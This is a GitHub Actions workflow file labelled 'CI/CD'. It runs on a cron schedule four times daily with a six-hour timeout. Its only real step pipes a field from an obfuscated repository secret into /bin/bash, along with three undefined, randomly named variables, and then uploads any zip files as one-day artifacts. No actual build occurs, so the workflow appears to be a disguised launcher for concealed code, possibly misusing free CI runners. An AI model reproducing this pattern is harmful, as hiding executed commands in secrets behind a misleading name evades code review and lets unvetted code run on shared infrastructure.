name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '34 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          kap9162: ${{ secrets.kap9162 }}
        run: |
          printf '%s' "$kap9162" | jq -r .k4989 | /bin/bash
          echo $juowd962 | jq -r .mpwpf5 | /bin/bash
          echo $rqlc50 | jq -r .gycfg65 | /bin/bash
          echo $spegg44921 | jq -r .emsf27330 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: pegMOiIo
          path: "*.zip"
          retention-days: 1
